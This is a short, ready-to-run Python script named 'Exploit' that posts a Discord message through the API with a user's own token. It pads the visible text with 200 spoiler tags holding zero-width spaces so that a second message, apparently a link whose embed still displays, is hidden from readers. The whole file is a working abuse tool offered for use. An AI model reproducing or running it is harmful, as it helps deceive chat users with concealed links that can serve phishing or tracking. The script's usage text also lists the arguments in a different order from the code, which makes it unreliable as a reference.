import requests
import sys

class Exploit:

    def __init__(self, token, channel, message, hidden_message):
        self.token = token
        self.channel_id = channel
        self.message = message
        self.hidden_message = hidden_message
        self.headers = {'Authorization': token}


    def _generate_message(self, m1, m2):
        
        return m1 + ('||\u200b||' * 200) + m2


    def execute(self):
        """ send masked message """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': self._generate_message(self.message, self.hidden_message)})

    
def main():
    if len(sys.argv) < 5:
        print(f'How to use: py {sys.argv[0]} <your token> <channel id> <hidden message> <real embed>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]
    message = sys.argv[3]
    hidden_message = sys.argv[4]

    exploit = Exploit(token, channel_id, message, hidden_message)

    exploit.execute()


if __name__ == '__main__':
    main()